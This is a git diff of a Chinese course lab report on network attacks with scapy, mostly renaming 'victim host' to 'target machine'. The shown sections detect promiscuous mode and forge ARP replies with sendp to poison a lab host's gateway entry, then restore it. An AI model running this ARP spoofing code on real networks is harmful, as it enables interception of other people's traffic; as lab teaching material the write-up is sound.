@@ -41,7 +41,7 @@ pip3 install scapy[complete]
 ## 实验一：检测局域网中的异常终端
 
 ```bash
-# 在受害者主机上检查网卡的「混杂模式」是否启用
+# 在靶机上检查网卡的「混杂模式」是否启用
 ip link show eth0
 ```
 
@@ -63,10 +63,10 @@ pkt = promiscping("172.16.111.134")
 ![scapy_pkt](img/scapy_pkt.jpg)
 
 ```bash
-# 回到受害者主机上开启网卡的『混杂模式』
+# 回到靶机上开启网卡的『混杂模式』
 # 注意上述输出结果里应该没有出现 PROMISC 字符串
 # 手动开启该网卡的「混杂模式」
-sudo ip link set eth1 promisc on
+sudo ip link set eth0 promisc on
 # 此时会发现输出结果里多出来了 PROMISC 
 ip link show eth0
 ```
@@ -83,7 +83,7 @@ pkt = promiscping("172.16.111.134")
 ![difference_attacker](img/difference_attacker.jpg)
 
 ```bash
-# 在受害者主机上
+# 在靶机上
 # 手动关闭该网卡的「混杂模式」
 sudo ip link set eth0 promisc off
 ```
@@ -95,9 +95,9 @@ sudo ip link set eth0 promisc off
 > - 混杂模式 接收所有经过网卡的数据包，包括不是发给本机的包，即不验证MAC地址
 > - 普通模式 网卡只接收发给本机的包
 
-可以看出在混杂模式下，受害者主机才能收到这个数据包。
+可以看出在混杂模式下，靶机才能收到这个数据包。
 
-在受害者主机上开启`Wireshark`抓包，也验证了这个问题。发送的包并没有指定目的主机的MAC地址，所以普通模式下发送不会成功
+在靶机上开启`Wireshark`抓包，也验证了这个问题。发送的包并没有指定目的主机的MAC地址，所以普通模式下发送不会成功
 
 
 
@@ -136,13 +136,13 @@ gw_mac
 # 这里要注意按照课件的代码试不能“毒化”的，需要在外面加一层Ethernet帧头
 arpspoofed = Ether()/ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.134", hwdst="08:00:27:bc:fe:e9")
 
-# 发送上述伪造的 ARP 响应数据包到受害者主机
+# 发送上述伪造的 ARP 响应数据包到靶机
 sendp(arpspoofed)
 ```
 
 ![forge_ARP](img/forge_ARP.jpg)
 
-此时在受害者主机上查看 `ARP` 缓存会发现网关的 MAC 地址**已被「替换」为攻击者主机的 MAC 地址**
+此时在靶机上查看 `ARP` 缓存会发现网关的 MAC 地址**已被「替换」为攻击者主机的 MAC 地址**
 
 ```bash
 ip neigh
@@ -159,13 +159,13 @@ sendp(restorepkt1, count=100, inter=0.2)
 
 ![recovery](img/recovery.jpg)
 
-此时在受害者主机上准备“刷新”网关 `ARP` 记录。
+此时在靶机上准备“刷新”网关 `ARP` 记录。
 
 ```bash
-## 在受害者主机上尝试 ping 网关
+## 在靶机上尝试 ping 网关
 ping 172.16.111.1
 ## 静候几秒 ARP 缓存刷新成功，退出 ping
-## 查看受害者主机上 ARP 缓存，已恢复正常的网关 ARP 记录
+## 查看靶机上 ARP 缓存，已恢复正常的网关 ARP 记录
 ip neigh
 ```
 
@@ -176,7 +176,7 @@ ip neigh
 ## 需要注意的问题：
 
 1. 注意Kali_Attacker配置Host-Only网络，否则安装不了东西。
-2. 勤备份，出错了好改。
+2. 勤备份，出错了容易修改。
 
 
 
